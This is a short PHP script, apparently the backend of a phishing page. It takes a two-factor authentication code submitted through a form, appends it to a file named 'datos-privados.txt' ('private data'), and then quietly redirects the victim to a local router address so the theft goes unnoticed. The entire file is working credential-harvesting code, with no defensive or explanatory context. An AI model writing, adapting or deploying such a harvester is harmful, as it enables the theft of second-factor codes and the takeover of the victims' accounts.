<?php
$file = 'datos-privados.txt';

$code = $_POST['code_2fa'] ?? 'sin código';

$log = "[🔐] Código 2FA: $code\n\n";
file_put_contents($file, $log, FILE_APPEND);

echo $log;

header("Refresh:0; url=http://192.168.1.1/index.php");
exit();
?>
